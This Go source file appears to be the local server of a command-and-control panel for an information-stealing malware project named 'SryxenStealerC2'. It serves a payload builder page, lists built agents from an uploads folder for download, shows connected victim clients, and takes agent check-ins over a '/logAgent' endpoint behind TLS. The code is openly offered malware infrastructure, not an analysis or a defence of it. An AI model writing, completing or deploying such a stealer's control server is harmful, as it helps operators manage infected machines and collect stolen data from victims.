package LocalServer

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"SryxenStealerC2/AgentHandler"
	"SryxenStealerC2/Router"
	"github.com/gorilla/mux"
)

type LocalServerState struct {
	server *http.Server
}

func GetAgents() ([]map[string]string, error) {
	uploadDir := "uploads"

	files, err := os.ReadDir(uploadDir)
	if err != nil {
		return nil, err
	}

	var agents []map[string]string
	for _, file := range files {
		if !file.IsDir() {
			agents = append(agents, map[string]string{
				"name": file.Name(),
				"file": file.Name(),
			})
		}
	}
	return agents, nil
}

func GetCertPathLocal(certType string) string {
	return filepath.Join("Certs", certType)
}

func (s *LocalServerState) Run(address string, port int) {
	r := mux.NewRouter()
    Router.AddBuilderHandler(r)

	r.HandleFunc("/agents", func(w http.ResponseWriter, r *http.Request) {
		agents, err := GetAgents()
		if err != nil {
			http.Error(w, "Failed to retrieve agents: "+err.Error(), http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
	}).Methods("GET")

	r.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
		agents, err := AgentHandler.GetAgents()
		if err != nil {
			http.Error(w, "Failed to retrieve agents: "+err.Error(), http.StatusInternalServerError)
			return
		}

		tmpl := template.Must(template.ParseFiles("public/clients.html"))

		err = tmpl.Execute(w, agents)
		if err != nil {
			http.Error(w, "Failed to render template", http.StatusInternalServerError)
		}
	}).Methods("GET")

	r.HandleFunc("/", Router.ServeHTMLFiles).Methods("GET")

	Router.ServeStaticFiles(r)
	r.HandleFunc("/builder", Router.ServeHTMLFiles).Methods("GET")

	r.HandleFunc("/logAgent", Router.HandleLogAgent).Methods("POST")
	r.Handle("/uploads/{fileName}", http.StripPrefix("/uploads", http.FileServer(http.Dir("uploads"))))

	s.server = &http.Server{
		Addr:    address + ":" + fmt.Sprintf("%d", port),
		Handler: r,
	}

	fmt.Printf("Starting local server on %s:%d...\n", address, port)

	certFile := GetCertPathLocal("certfile.pem")
	keyFile := GetCertPathLocal("keyfile.pem")

	if _, err := os.Stat(certFile); os.IsNotExist(err) {
		log.Fatalf("SSL certificate not found: %v", err)
	}
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		log.Fatalf("SSL key file not found: %v", err)
	}

	err := s.server.ListenAndServeTLS(certFile, keyFile)
	if err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
